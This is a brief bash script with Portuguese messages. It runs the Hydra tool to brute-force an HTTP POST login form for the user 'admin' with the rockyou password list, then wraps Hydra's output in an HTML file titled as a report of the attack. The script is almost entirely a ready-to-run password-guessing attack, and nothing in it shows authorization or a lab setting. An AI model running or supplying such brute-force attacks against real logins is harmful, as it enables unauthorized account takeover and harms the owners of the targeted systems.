#!/bin/bash
echo "Iniciando ataque com Hydra..."
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "login.php:username=^USER^&password=^PASS^:Login failed" -V -o hydra-output.txt

echo "<html><body><h1>Relatório do Ataque Hydra</h1><pre>" > relatorio.html
cat hydra-output.txt >> relatorio.html
echo "</pre></body></html>" >> relatorio.html

cp relatorio.html report.html
